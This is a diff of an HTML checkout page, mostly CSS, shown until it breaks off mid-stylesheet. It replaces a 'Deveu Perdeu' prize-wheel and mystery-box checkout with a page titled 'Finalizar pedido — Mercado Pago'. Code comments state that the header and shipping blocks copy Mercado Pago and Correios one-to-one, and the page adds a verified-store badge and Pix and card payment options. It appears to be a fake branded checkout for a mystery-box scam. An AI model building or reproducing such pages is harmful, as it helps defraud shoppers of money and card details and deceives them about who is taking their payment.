@@ -1,450 +1,2587 @@
 <!doctype html>
-<html lang="pt-BR"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Checkout – Deveu Perdeu</title>
-<style>@font-face{font-family:"Inter";font-style:normal;font-weight:400 900;src:url(/assets/3100e775e8616cd2.woff2)format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
-.rl-overlay{position:fixed;inset:0;z-index:900;background:rgba(10,11,13,.82);backdrop-filter:blur(4px);align-items:center;justify-content:center;padding:16px;display:none}
-.rl-overlay.show{display:flex}
-.rl-card{position:relative;width:100%;max-width:380px;background:#fff;border-radius:20px;padding:22px 18px 18px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.4);animation:rlIn .3s ease}
-@keyframes rlIn{from{transform:scale(.92);opacity:0}to{transform:none;opacity:1}}
-.rl-eyebrow{font-size:11px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--primary);margin-bottom:2px}
-.rl-title{font-size:21px;font-weight:900;letter-spacing:-.02em;margin:4px 0;color:var(--text)}
-.rl-sub{font-size:12.5px;color:var(--text-muted);margin-bottom:14px;line-height:1.4}
-.rl-wheel-wrap{position:relative;width:260px;height:260px;margin:0 auto 16px;border-radius:50%;padding:10px;background:radial-gradient(circle,#23272f 55%,#181b20 70%,#d97706 94%,#f59e0b 100%);box-shadow:0 0 0 3px #121316,0 0 22px rgba(245,158,11,0.4),0 16px 36px rgba(0,0,0,0.4)}
-.rl-wheel-wrap::before{content:'';position:absolute;inset:3px;border-radius:50%;border:2px dashed rgba(254,240,138,0.7);pointer-events:none;z-index:4}
-.rl-pointer{position:absolute;top:-10px;left:50%;transform:translateX(-50%);z-index:10;width:0;height:0;border-left:14px solid transparent;border-right:14px solid transparent;border-top:26px solid #f59e0b;filter:drop-shadow(0 3px 6px rgba(0,0,0,.55))}
-.rl-pointer::after{content:'';position:absolute;top:-26px;left:-8px;width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-top:18px solid #121316}
-.rl-wheel{position:relative;width:100%;height:100%;border-radius:50%;border:6px solid #121316;box-shadow:inset 0 0 14px rgba(0,0,0,.45);transition:transform 4.6s cubic-bezier(.12,.8,.12,1);overflow:hidden}
-.rl-seg{position:absolute;left:50%;top:50%;width:50%;height:26px;margin-top:-13px;transform-origin:0 50%;display:flex;align-items:center;justify-content:flex-end;padding-right:10px;font-size:10px;font-weight:900;line-height:1.05;text-align:right;text-transform:uppercase}
-.rl-hub{position:absolute;left:50%;top:50%;width:58px;height:58px;margin:-29px 0 0 -29px;border-radius:50%;background:radial-gradient(circle,#242831 40%,#121316 100%);border:3.5px solid #f59e0b;z-index:6;display:flex;align-items:center;justify-content:center;color:#fff;font-size:10.5px;font-weight:900;letter-spacing:.05em;box-shadow:0 0 12px rgba(245,158,11,0.45),0 3px 10px rgba(0,0,0,.4)}
-.rl-btn{width:100%;background:linear-gradient(180deg,#ff6b00,#e85d00);color:#fff;border:0;border-radius:12px;padding:15px;font-family:inherit;font-size:16px;font-weight:900;cursor:pointer;box-shadow:0 6px 18px rgba(255,107,0,.32);transition:transform .15s,filter .15s}
-.rl-btn:hover{filter:brightness(1.05)}
-.rl-btn:active{transform:scale(.98)}
-.rl-btn:disabled{opacity:.65;cursor:default}
-.rl-result.show{display:block;animation:rlIn .35s ease}
-.rl-prize{position:relative;display:flex;align-items:center;gap:14px;text-align:left;background:linear-gradient(135deg,#fffbeb 0%,#fef3c7 100%);border:2px solid #f59e0b;border-radius:16px;padding:14px 16px;margin:12px 0 16px;box-shadow:0 4px 18px rgba(245,158,11,0.22),inset 0 1px 0 rgba(255,255,255,0.8)}
-.rl-prize-badge{position:absolute;top:-9px;left:14px;background:linear-gradient(90deg,#d97706,#f59e0b);color:#fff;font-size:9.5px;font-weight:900;letter-spacing:0.5px;padding:2px 8px;border-radius:999px;text-transform:uppercase;box-shadow:0 2px 6px rgba(217,119,6,0.35)}
-.rl-prize-ic{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,#ff6b00,#f59e0b);color:#fff;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 4px 12px rgba(255,107,0,0.3)}
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>Finalizar pedido — Mercado Pago</title>
+  <link rel="preconnect" href="https://http2.mlstatic.com">
+  <script type="module" src="/assets/boxes-tiktok.js?v=2"></script>
+  <style>
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-bold.woff2') format('woff2');
+}
 
-.rl-prize b{display:block;font-size:15px;font-weight:900;color:var(--text)}
-.rl-prize small{font-size:11.5px;color:var(--text-muted);font-weight:600;display:block;margin-top:1px}
-.rl-confetti{position:fixed;inset:0;pointer-events:none;z-index:950;overflow:hidden}
-.rl-confetti i{position:absolute;top:-14px;width:8px;height:14px;border-radius:2px;animation:rlFall linear forwards}
-@keyframes rlFall{to{transform:translateY(110vh) rotate(720deg)}}
-.rl-peek{margin:4px 0 16px}
-.rl-peek-t{font-size:12px;font-weight:800;color:var(--text);margin-bottom:8px}
-.rl-peek-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
-.rl-peek-i{position:relative;aspect-ratio:1;border-radius:12px;overflow:hidden;background:var(--bg);border:1.5px solid var(--border)}
-.rl-peek-i img{width:100%;height:100%;object-fit:cover;filter:blur(5px) saturate(.9);transform:scale(1.15)}
-.rl-peek-i span{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.6);background:linear-gradient(180deg,rgba(18,19,22,.35),rgba(18,19,22,.75))}
-.rl-peek-i span small{font-size:9.5px;font-weight:800;letter-spacing:.04em;text-transform:uppercase;margin-top:2px;color:#fff}
-.rl-peek-n{font-size:10.5px;color:var(--text-muted);margin-top:7px}
+:root {
+  --mp-blue: #009ee3;
+  --mp-blue-hover: #0084c2;
+  --mp-navy: #002c6c;
+  --bg-page: #f5f6f8;
+  --bg-card: #ffffff;
+  --border-card: #e2e8f0;
+  --border-input: #cbd5e1;
+  --text-main: #0f172a;
+  --text-sub: #475569;
+  --font-base: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+  background-color: var(--bg-page);
+  color: var(--text-main);
+  font-family: var(--font-base);
+  font-size: 15px;
+  font-weight: 500;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+}
+
+[hidden] { display: none !important; }
+button, input, select { font: inherit; }
+button { cursor: pointer; border: 0; background: none; }
+button:disabled { cursor: not-allowed; opacity: 0.6; }
+a { color: inherit; text-decoration: none; }
+
+.checkout-shell {
+  width: 100%;
+  max-width: 520px;
+  margin: 0 auto;
+  min-height: 100vh;
+  padding: 16px 16px 48px;
+  display: flex;
+  flex-direction: column;
+}
+
+@media (min-width: 640px) {
+  body {
+    background-color: #e9ecef;
+    padding: 32px 16px 64px;
+  }
+  .checkout-shell {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 12px 36px rgba(0, 0, 0, 0.07);
+    border: 1.5px solid #cbd5e1;
+    min-height: auto;
+    padding: 30px 28px 48px;
+  }
+}
+
+/* Header 1:1 Mercado Pago Reference */
+.mp-header {
+  margin-bottom: 16px;
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+}
+.mp-top-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  width: 100%;
+  padding: 2px 2px 14px;
+}
+.mp-logo-img {
+  height: 44px;
+  width: auto;
+  display: block;
+  object-fit: contain;
+}
+.mp-secure-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  color: #475569;
+}
+.mp-secure-lock {
+  width: 15px;
+  height: 15px;
+  stroke: #475569;
+  flex-shrink: 0;
+}
+.mp-secure-text {
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #475569;
+  letter-spacing: -0.1px;
+}
+
+/* Store Partner Card 1:1 */
+.store-partner-card {
+  width: 100%;
+  background: #ffffff;
+  border: 1px solid #e2e8f0;
+  border-radius: 14px;
+  padding: 12px 14px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  box-sizing: border-box;
+}
+.store-avatar {
+  width: 46px;
+  height: 46px;
+  min-width: 46px;
+  border-radius: 50%;
+  background-color: #8b9cb6;
+  color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  font-weight: 700;
+  line-height: 1;
+  text-transform: uppercase;
+  user-select: none;
+}
+.store-info {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  gap: 3px;
+  min-width: 0;
+}
+.store-title-row {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.store-name {
+  font-size: 16px;
+  font-weight: 700;
+  color: #0f172a;
+  line-height: 1.2;
+}
+.store-verified-icon {
+  width: 18px;
+  height: 18px;
+  min-width: 18px;
+  display: block;
+}
+.store-subtext {
+  font-size: 13px;
+  font-weight: 400;
+  color: #64748b;
+  margin: 0;
+  line-height: 1.25;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+/* Product Card */
+.product-card {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 12px;
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.03);
+  margin-bottom: 20px;
+}
+@media (min-width: 640px) {
+  .product-card {
+    background: #f8fafc;
+  }
+}
+.product-thumb {
+  width: 54px;
+  height: 54px;
+  min-width: 54px;
+  max-width: 54px;
+  border-radius: 8px;
+  border: 1px solid #cbd5e1;
+  overflow: hidden;
+  background: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.product-thumb img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+.product-details {
+  flex: 1;
+  min-width: 0;
+}
+.product-title {
+  font-size: 13.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 2px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.product-subtitle {
+  font-size: 12px;
+  font-weight: 500;
+  color: #475569;
+  margin: 0 0 2px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.product-qty {
+  font-size: 11.5px;
+  font-weight: 500;
+  color: #64748b;
+  margin: 0;
+}
+.product-price {
+  font-size: 16px;
+  font-weight: 800;
+  color: #0f172a;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-left: auto;
+}
+
+/* Stepper */
+.stepper {
+  display: flex;
+  list-style: none;
+  padding: 0 10px;
+  margin: 14px 0 24px;
+  position: relative;
+}
+.stepper li {
+  flex: 1;
+  position: relative;
+  text-align: center;
+}
+.stepper li:not(:last-child)::after {
+  content: '';
+  position: absolute;
+  top: 16px;
+  left: 50%;
+  width: 100%;
+  height: 3px;
+  background: #cbd5e1;
+  z-index: 1;
+}
+.stepper li.done:not(:last-child)::after,
+.stepper li.completed:not(:last-child)::after {
+  background: #009ee3;
+}
+.stepper button {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+  background: none;
+  border: none;
+  padding: 0;
+}
+.step-circle {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  font-weight: 700;
+  background: #ffffff;
+  color: #64748b;
+  border: 2.5px solid #94a3b8;
+  transition: all 0.2s;
+}
+.step-circle svg {
+  width: 16px;
+  height: 16px;
+  stroke: #ffffff;
+  stroke-width: 3.2;
+  fill: none;
+}
+.stepper li.active .step-circle {
+  background: #009ee3;
+  color: #ffffff;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.2);
+}
+.stepper li.done .step-circle,
+.stepper li.completed .step-circle {
+  background: #009ee3;
+  color: #ffffff;
+  border-color: #009ee3;
+}
+.step-label {
+  font-size: 13.5px;
+  font-weight: 600;
+  margin-top: 6px;
+  color: #64748b;
+}
+.stepper li.active .step-label {
+  color: #0f172a;
+  font-weight: 700;
+}
+.stepper li.done .step-label,
+.stepper li.completed .step-label {
+  color: #334155;
+}
+
+/* Titles */
+.section-title {
+  font-size: 22px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+}
+.section-desc {
+  font-size: 14.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 16px;
+}
+
+/* Form Card */
+.form-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 16px;
+  padding: 20px 18px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+}
+@media (min-width: 640px) {
+  .form-card {
+    background: #f8fafc;
+  }
+}
+
+.field {
+  display: flex;
+  flex-direction: column;
+}
+.field label {
+  font-size: 15px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 6px;
+}
+.field input, .field select {
+  width: 100%;
+  height: 52px;
+  padding: 0 16px;
+  background: #ffffff;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  color: #0f172a;
+  outline: none;
+  box-sizing: border-box;
+  transition: background-color 0.2s, border-color 0.2s, box-shadow 0.2s;
+}
+.field input::placeholder {
+  color: #94a3b8;
+  font-weight: 400;
+}
+/* Fundo azul nos campos de preenchimento quando ativo ou preenchido */
+.field input:focus, .field select:focus {
+  background-color: #f0f9ff;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3.5px rgba(0, 158, 227, 0.2);
+}
+.field input:not(:placeholder-shown) {
+  background-color: #f0f9ff;
+  border-color: #7dd3fc;
+}
+.field input:not(:placeholder-shown):focus {
+  background-color: #e0f2fe;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3.5px rgba(0, 158, 227, 0.25);
+}
+
+/* Bolinha de check minimalista e elegante (Azul Mercado Pago) */
+.field label {
+  display: flex !important;
+  align-items: center !important;
+  font-size: 14.5px !important;
+  font-weight: 700 !important;
+  color: #0f172a !important;
+  margin-bottom: 6px !important;
+}
+.field-check-badge {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  margin-left: 6px;
+  opacity: 0;
+  transform: scale(0.6);
+  transition: opacity 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+  pointer-events: none;
+  line-height: 1;
+}
+.field-check-badge.active {
+  opacity: 1;
+  transform: scale(1);
+}
+.field-check-badge svg {
+  width: 14px;
+  height: 14px;
+  display: block;
+}
+
+/* Input quando preenchido e válido: suave estilo Mercado Pago */
+.field input.field-valid, .field select.field-valid {
+  background-color: #f0f9ff !important;
+  border-color: #009ee3 !important;
+}
 
 
-/* Mystery Box 3D & Inline Pix Generated */
-.mb{position:relative;margin:0 0 14px;padding:16px 14px 14px;border-radius:16px;background:radial-gradient(120% 90% at 50% 0%,#2a1a0c 0%,#121316 70%);color:#fff;text-align:center;overflow:hidden}
-.mb-stage{position:relative;height:178px;margin:0 auto 8px;width:300px;max-width:100%}
-.mb-prod{position:absolute;width:68px;height:68px;border-radius:14px;overflow:hidden;background:#fff;box-shadow:0 6px 16px rgba(0,0,0,.35);animation:mbFloat 2.6s ease-in-out infinite}
-.mb-prod img{width:100%;height:100%;object-fit:contain;filter:blur(7px) saturate(1.1);transform:scale(1.2)}
-.mb-prod b{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#fff;text-shadow:0 1px 4px rgba(0,0,0,.7);background:rgba(18,19,22,.45)}
-.mb-prod b small{font-size:8px;letter-spacing:.02em;white-space:nowrap;text-transform:uppercase;margin-top:1px}
-.mb-p1{left:2px;top:22px;transform:rotate(-10deg)}
-.mb-p2{left:76px;top:0;transform:rotate(-4deg);animation-delay:.4s}
-.mb-p3{right:76px;top:0;transform:rotate(4deg);animation-delay:.8s}
-.mb-p4{right:2px;top:22px;transform:rotate(10deg);animation-delay:1.2s}
-.mb-box{position:absolute;left:50%;bottom:0;width:170px;height:112px;margin-left:-85px;z-index:2;animation:mbShake 1.6s ease-in-out infinite;transform-origin:50% 100%}
-.mb-body{position:absolute;left:0;right:0;bottom:0;height:92px;border-radius:6px 6px 12px 12px;background:linear-gradient(180deg,#ff8a2b,#ff6b00 60%,#e55d00);box-shadow:0 14px 28px rgba(255,107,0,.35),inset 0 -6px 0 rgba(0,0,0,.12);display:flex;align-items:center;justify-content:center}
-.mb-body:before{content:"";position:absolute;top:0;bottom:0;left:50%;width:18px;margin-left:-9px;background:rgba(255,255,255,.22)}
-.mb-q{position:relative;width:46px;height:46px;border-radius:50%;background:#121316;color:#ff6b00;font-size:28px;font-weight:900;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 3px rgba(255,255,255,.25)}
-.mb-lid{position:absolute;left:-8px;right:-8px;top:0;height:26px;border-radius:8px;background:linear-gradient(180deg,#ffa04d,#ff7a14);box-shadow:0 4px 0 rgba(0,0,0,.15);transition:transform .7s cubic-bezier(.3,1.6,.5,1);transform-origin:0 100%}
-.mb-lid:before{content:"";position:absolute;top:0;bottom:0;left:50%;width:18px;margin-left:-9px;background:rgba(255,255,255,.25)}
-.mb-t{font-size:16px;font-weight:900;margin-bottom:4px}
-.mb-t em{font-style:normal;color:#ff8a2b}
-.mb-s{font-size:12.5px;line-height:1.45;color:#d6d6db;max-width:330px;margin:0 auto}
-.mb-n{font-size:10.5px;color:#8d8d96;margin-top:8px}
-.mb-glow{position:absolute;left:50%;bottom:60px;width:10px;height:10px;margin-left:-5px;border-radius:50%;background:#ffd29a;box-shadow:0 0 0 0 rgba(255,200,120,.0);opacity:0;z-index:1}
-@keyframes mbShake{0%,55%,100%{transform:rotate(0)}60%{transform:rotate(-5deg) translateY(-3px)}68%{transform:rotate(5deg) translateY(-3px)}76%{transform:rotate(-4deg)}84%{transform:rotate(3deg)}92%{transform:rotate(-1deg)}}
-@keyframes mbFloat{0%,100%{margin-top:0}50%{margin-top:-7px}}
-@keyframes mbPop{0%{margin-top:0}50%{margin-top:-14px}100%{margin-top:-4px}}
-@keyframes mbGlow{0%{box-shadow:0 0 0 0 rgba(255,200,120,.9)}100%{box-shadow:0 0 60px 70px rgba(255,200,120,0)}}
+.field [aria-invalid="true"] {
+  border-color: #ef4444;
+}
+.field-error {
+  color: #dc2626;
+  font-size: 13px;
+  font-weight: 600;
+  margin-top: 4px;
+}
+.field-error:empty { display: none; }
 
-.pix-generated{display:none}
-.pix-generated.show{display:block;animation:fadeInPix .35s ease forwards}
-@keyframes fadeInPix{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-.pix-timer-bar{display:flex;align-items:center;justify-content:center;gap:8px;background:#fff8e1;border:1.5px solid #fde68a;border-radius:10px;padding:10px;font-size:13px;font-weight:800;color:#92400e;margin-bottom:14px}
-.pix-timer-bar svg{width:16px;height:16px}
-.pix-qr-wrap{display:flex;flex-direction:column;align-items:center;margin-bottom:14px}
-.pix-qr-wrap img{width:200px;height:200px;border-radius:12px;border:3px solid var(--border);padding:8px;background:#fff}
-.pix-copy-wrap{position:relative;margin-bottom:14px}
-.pix-copy-input{width:100%;background:#f9fafb;border:1.5px solid var(--border);border-radius:10px;padding:12px 90px 12px 14px;font-size:11px;font-family:monospace;color:var(--text-muted);word-break:break-all;line-height:1.4;min-height:52px;display:flex;align-items:center}
-.copy-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:var(--primary);border:none;border-radius:8px;padding:8px 14px;color:#fff;font-family:inherit;font-size:12px;font-weight:800;cursor:pointer;white-space:nowrap;transition:background .2s,transform .1s}
-.copy-btn:hover{background:var(--primary-dark)}
-.copy-btn:active{transform:translateY(-50%) scale(.97)}
-.pix-waiting{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;font-weight:700;color:var(--text-muted);margin-bottom:4px}
-.pulse{width:10px;height:10px;border-radius:50%;background:var(--primary);animation:pulse 1.4s infinite}
-@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
+.fields-grid-2 {
+  display: grid;
+  gap: 12px;
+}
+.fields-grid-2.number-comp {
+  grid-template-columns: 32% calc(68% - 12px);
+}
+.fields-grid-2.city-state {
+  grid-template-columns: calc(70% - 12px) 30%;
+}
 
+.cep-field-wrap {
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+.cep-field-wrap input {
+  padding-right: 115px;
+}
+.btn-buscar-cep {
+  position: absolute;
+  right: 14px;
+  color: #009ee3;
+  font-size: 14.5px;
+  font-weight: 700;
+  padding: 6px 10px;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+.btn-buscar-cep:hover {
+  text-decoration: underline;
+}
+#cepStatus {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #0284c7;
+  margin-top: 5px;
+}
+#cepStatus:empty { display: none; }
+
+/* Shipping Card */
+/* Opções de Entrega 1:1 Correios Reference */
+.shipping-section-header {
+  margin-top: 22px;
+  margin-bottom: 12px;
+  text-align: left;
+}
+.shipping-section-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+  letter-spacing: -0.2px;
+}
+.shipping-section-sub {
+  font-size: 14px;
+  color: #64748b;
+  margin: 0;
+}
+.shipping-options-list {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  margin-bottom: 24px;
+}
+.shipping-option-card {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 16px 16px;
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 16px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  user-select: none;
+}
+.shipping-option-card.selected {
+  border: 2px solid #009ee3;
+  box-shadow: 0 0 0 1px #009ee3, 0 4px 14px rgba(0, 158, 227, 0.1);
+}
+.ship-radio {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.ship-radio-circle {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  border: 2px solid #94a3b8;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: border-color 0.15s ease, background 0.15s ease;
+}
+.shipping-option-card.selected .ship-radio-circle {
+  border-color: #009ee3;
+  background: #009ee3;
+}
+.ship-radio-dot {
+  width: 9px;
+  height: 9px;
+  border-radius: 50%;
+  background: transparent;
+  transition: background 0.15s ease;
+}
+.shipping-option-card.selected .ship-radio-dot {
+  background: #ffffff;
+}
+
+/* Correios Real Brand Block */
+.ship-brand-col {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  width: 82px;
+}
+.correios-real-logo {
+  width: 80px;
+  height: auto;
+  max-height: 22px;
+  display: block;
+}
+
+/* Ship Info Column */
+.ship-info-col {
+  flex: 1;
+  min-width: 0;
+  text-align: left;
+}
+.ship-title {
+  font-size: 15.5px;
+  font-weight: 700;
+  color: #0f172a;
+  line-height: 1.25;
+  margin-bottom: 3px;
+}
+.ship-deadline {
+  font-size: 13.5px;
+  color: #64748b;
+  margin-bottom: 6px;
+  line-height: 1.3;
+}
+.ship-tags-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  font-size: 12px;
+  color: #64748b;
+}
+.ship-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-size: 12px;
+  color: #64748b;
+}
+.ship-tag svg {
+  stroke: #64748b;
+  flex-shrink: 0;
+}
+.ship-tag-sep {
+  color: #cbd5e1;
+}
+
+/* Badge & Price Column */
+.ship-badge-col {
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+}
+.badge-frete-gratis {
+  display: inline-block;
+  background: #dcfce7;
+  color: #15803d;
+  font-size: 13.5px;
+  font-weight: 700;
+  padding: 6px 14px;
+  border-radius: 20px;
+  white-space: nowrap;
+}
+.price-sedex {
+  font-size: 17px;
+  font-weight: 700;
+  color: #0f172a;
+  white-space: nowrap;
+}
+
+
+/* CEP Modal and Address Finder */
+.btn-link-address-search {
+  background: none;
+  border: none;
+  color: #009ee3;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  padding: 0;
+  text-decoration: underline;
+  text-align: left;
+  font-family: inherit;
+}
+.btn-link-address-search:hover {
+  color: #0084c2;
+}
+.cep-modal-backdrop {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(15, 23, 42, 0.65);
+  backdrop-filter: blur(4px);
+  z-index: 99999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
+.cep-modal-backdrop[hidden] {
+  display: none !important;
+}
+.cep-modal-content {
+  background: #ffffff;
+  border-radius: 20px;
+  width: 100%;
+  max-width: 440px;
+  max-height: 90vh;
+  display: flex;
+  flex-direction: column;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+  overflow: hidden;
+  animation: modalFadeIn 0.2s ease-out;
+}
+@keyframes modalFadeIn {
+  from { opacity: 0; transform: scale(0.96); }
+  to { opacity: 1; transform: scale(1); }
+}
+.cep-modal-header {
+  padding: 16px 20px;
+  border-bottom: 1px solid #e2e8f0;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.cep-modal-header h3 {
+  margin: 0;
+  font-size: 17px;
+  font-weight: 700;
+  color: #0f172a;
+}
+.btn-close-modal {
+  background: none;
+  border: none;
+  font-size: 26px;
+  line-height: 1;
+  color: #64748b;
+  cursor: pointer;
+  padding: 4px;
+}
+.cep-modal-body {
+  padding: 18px 20px;
+  overflow-y: auto;
+}
+.cep-modal-desc {
+  font-size: 13.5px;
+  color: #475569;
+  margin: 0 0 14px;
+  line-height: 1.4;
+}
+.modal-form-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+.modal-field {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  text-align: left;
+}
+.modal-field label {
+  font-size: 12.5px;
+  font-weight: 600;
+  color: #334155;
+}
+.modal-input {
+  width: 100%;
+  height: 42px;
+  border: 1.5px solid #cbd5e1;
+  border-radius: 10px;
+  padding: 0 12px;
+  font-size: 14px;
+  color: #0f172a;
+  background: #f8fafc;
+  box-sizing: border-box;
+  font-family: inherit;
+}
+.modal-input:focus {
+  border-color: #009ee3;
+  outline: none;
+  background: #ffffff;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.15);
+}
+.modal-cep-results {
+  margin-top: 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  max-height: 200px;
+  overflow-y: auto;
+}
+.modal-cep-item {
+  padding: 10px 14px;
+  background: #f8fafc;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+  text-align: left;
+}
+.modal-cep-item:hover {
+  background: #edf5ff;
+  border-color: #009ee3;
+}
+.modal-cep-item strong {
+  display: block;
+  font-size: 14px;
+  color: #009ee3;
+  margin-bottom: 2px;
+}
+.modal-cep-item span {
+  display: block;
+  font-size: 12.5px;
+  color: #475569;
+  line-height: 1.35;
+}
+
+/* Payment Methods */
+.payment-methods {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+.payment-card {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 18px;
+  background: #ffffff;
+  border: 1.8px solid #e2e8f0;
+  border-radius: 14px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  transition: all 0.2s;
+  cursor: pointer;
+  width: 100%;
+  text-align: left;
+}
+.payment-card.active {
+  border: 2.2px solid #009ee3;
+  background: #ffffff;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.12);
+}
+.payment-card-left {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.pm-icon-wrap {
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+  flex-shrink: 0;
+}
+.pm-icon-wrap.pix {
+  background: #00bdae;
+  color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.pm-icon-wrap.pix svg {
+  width: 24px;
+  height: 24px;
+  display: block;
+}
+.pm-icon-wrap.card {
+  background: #edf3f8;
